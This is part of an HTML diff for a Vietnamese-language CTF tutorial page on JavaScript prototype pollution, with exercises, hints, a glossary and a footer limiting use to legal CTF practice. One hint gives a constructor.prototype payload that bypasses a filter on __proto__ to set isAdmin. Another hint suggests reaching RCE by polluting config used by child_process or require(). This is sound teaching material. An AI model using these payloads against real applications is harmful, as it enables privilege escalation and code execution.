+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, ô nhiễm qua 1 endpoint rồi xác nhận ảnh
+  hưởng ở endpoint khác.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ pollution KHÔNG hiện ra trong response của chính request ô nhiễm
+  — luôn phải kiểm tra ở nơi KHÁC.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> endpoint merge chặn đúng chuỗi <code>__proto__</code>. Dùng
+  <code>constructor.prototype</code> để vẫn đạt được pollution.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>{"constructor": {"prototype": {"isAdmin": true}}}</code> — xem
+  mục 06.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> route kiểm tra quyền dùng <code>Object.prototype.hasOwnProperty.call(user, 'isAdmin')</code>
+  (miễn nhiễm với prototype pollution ở route NÀY). Nhưng app còn 1 endpoint khác merge config hệ thống (không
+  liên quan user) có thể bị ảnh hưởng theo cách khác. Nghĩ hướng khai thác không nhắm vào "quyền user" mà nhắm
+  vào cấu hình hệ thống (vd thay đổi đường dẫn file log, option NODE_OPTIONS nếu có).</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Prototype pollution đôi khi dẫn tới RCE nếu ô nhiễm được 1 option cấu
+  hình mà app sau đó dùng để gọi <code>child_process</code>/<code>require()</code> — tìm đúng biến cấu hình nào
+  trong app có "sức mạnh" này thay vì chỉ nhắm vào field quyền hạn.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Prototype chain</td><td>Chuỗi các object cha mà JavaScript tự động tra cứu khi không tìm thấy thuộc tính trực tiếp trên object.</td></tr>
+    <tr><td>Deep merge</td><td>Hàm trộn 2 object đệ quy, bao gồm cả các object lồng bên trong.</td></tr>
+    <tr><td>Gadget (client-side)</td><td>Đoạn code có sẵn trong app, khi kết hợp với property đã bị ô nhiễm sẽ dẫn tới hành vi nguy hiểm (XSS, RCE).</td></tr>
+    <tr><td><code>hasOwnProperty()</code></td><td>Hàm JavaScript kiểm tra thuộc tính có tồn tại TRỰC TIẾP trên object hay không, bỏ qua prototype chain — cách phòng thủ chuẩn.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Prototype Pollution/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("pp-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("pp-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
